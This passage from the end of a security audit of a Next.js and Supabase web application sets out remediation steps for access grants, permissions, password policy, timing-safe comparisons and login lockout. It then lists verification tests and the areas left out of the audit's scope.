2. (Migration) Revoke anon + authenticated SELECT on the sensitive table list. Re-grant SELECT on the explicitly-public list.
3. (Code) Make `createUserSchema.password` required; remove `DEFAULT_DEV_PASSWORD` from prod path. Or add `inviteUserByEmail` flow.
4. (Code) Add `requirePermAsync('trash.restore')` to `/admin/trash/[entity]/page.tsx` + `restoreAction`. Add `security.sessions.{read,revoke}` perms + seed migration + page/action enforcement.
5. (Migration) Seed `trash.restore` (admin only), `security.sessions.read` + `security.sessions.revoke` (admin only).
6. (Code) Fix middleware: replace `ADMIN_ROLES` constant with a "has any admin-side perm" computed check via the same `getRolePerms` cache. Allow loc/idc/referee/production to reach `/admin/*` (per-page perms still gate).
7. (Code) Replace `===` comparison in cron routes with `crypto.timingSafeEqual`.
8. (Deps) Remove `node-tesseract-ocr` from `package.json`; delete `parse.tesseract.ts`; simplify `parse.ts` to Anthropic-only with a manual-paste fallback.
9. (Supabase dashboard, manual) Raise password min length to 12. Enable Auth MFA. Document in MEMORY.
10. (Code, defer to Plan 40 if scope creeps) Login failed-attempt counter + 15-min lockout.

**Verification cadence per CLAUDE.md §Verification discipline:**
`npm test`, `npm run lint`, `npm run build`, `npm --workspace apps/web run e2e`, plus a fresh Playwright spec asserting:
- Anon PostgREST `select * from disciplinary_actions` returns 0 rows / 401.
- Anon PostgREST `select email,phone from users` returns 0 rows / 401.
- Moderator hitting `restoreAction` gets 403.
- Login with email never used returns generic "Invalid email or password" (no enumeration).

---

## O. What I did NOT audit (out of scope, flagged for future)

- npm `outdated` (only `audit` was run).
- Supabase Auth dashboard settings (manual) — verify A2/A3 in the dashboard.
- Realtime channel ACLs (Plan 16 broadcast pubsub).
- Storage CORS configuration (relevant once a non-Vercel client uploads).
- Subresource Integrity / CSP headers (no CSP set today; `next.config.ts` does not configure `headers()`).
- Container / Vercel runtime CVEs.
- Source-map exposure in production build (Next default: maps off in prod).
- Supply-chain (lockfile audit, signed tags, Dependabot).

---

*End of audit.*
